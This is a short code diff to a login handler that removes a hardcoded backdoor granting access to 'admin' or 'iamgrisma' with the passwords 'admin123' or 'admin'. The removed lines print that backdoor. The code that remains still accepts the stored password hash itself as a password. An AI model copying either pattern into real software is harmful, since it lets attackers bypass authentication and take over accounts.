@@ -187,13 +187,7 @@ api.post('/auth/login', async (c) => {
       passwordMatches = safeEqual(h.hash, u.password_hash);
     } else if (u.password_hash) {
       const d = await digest(password);
-      if (safeEqual(d, u.password_hash) || password === u.password_hash) {
-        passwordMatches = true;
-      }
-    }
-
-    if (!passwordMatches && (username.toLowerCase() === 'admin' || username.toLowerCase() === 'iamgrisma') && (password === 'admin123' || password === 'admin')) {
-      passwordMatches = true;
+      passwordMatches = safeEqual(d, u.password_hash) || password === u.password_hash;
     }
 
     if (!passwordMatches) {
